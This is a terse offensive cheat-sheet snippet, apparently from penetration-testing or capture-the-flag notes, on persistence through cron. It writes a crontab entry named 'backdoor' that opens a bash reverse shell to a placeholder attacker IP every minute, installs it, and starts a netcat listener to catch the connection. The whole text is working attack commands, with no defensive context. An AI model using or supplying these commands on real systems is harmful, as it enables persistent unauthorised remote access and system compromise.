- cat /etc/cron*
  - echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/<attacker_ip>/1234 0>&1'" > backdoor
  - crontab -i backdoor
  - crontab -l

- nc -nlvp 1234
